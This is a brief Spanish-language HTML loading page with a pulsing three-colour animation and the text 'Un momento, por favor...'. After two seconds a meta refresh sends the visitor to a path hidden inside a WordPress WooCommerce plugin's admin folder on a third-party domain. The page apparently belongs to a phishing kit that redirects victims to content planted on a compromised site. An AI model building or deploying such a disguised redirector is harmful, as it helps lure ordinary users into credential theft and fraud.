
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Loading</title>
  <meta http-equiv="refresh" content="2; url=https://lomastecnologico.com/wp-content/plugins/woocommerce/includes/admin/helper/views/sys/"> 
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      background-color: white;
      font-family: Arial, sans-serif;
    }

    .loader {
      position: relative;
      width: 80px;
      height: 80px;
    }

    .loader .circle {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      animation: pulse 1.5s infinite ease-in-out;
    }

    .loader .circle:nth-child(1) {
      border: 4px solid #003f88; /* Azul */
      animation-delay: 0s;
    }

    .loader .circle:nth-child(2) {
      border: 4px solid #ff323a; /* Rojo */
      animation-delay: 0.5s;
    }

    .loader .circle:nth-child(3) {
      border: 4px solid #ffba02; /* Amarillo */
      animation-delay: 1s;
    }

    @keyframes pulse {
      0% {
        transform: scale(1);
        opacity: 1;
      }
      100% {
        transform: scale(1.5);
        opacity: 0;
      }
    }

    p {
      margin-top: 20px;
      font-size: 18px;
      color: #003f88;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="loader">
    <div class="circle"></div>
    <div class="circle"></div>
    <div class="circle"></div>
  </div>
  <p>Un momento, por favor...</p>
</body>
</html>
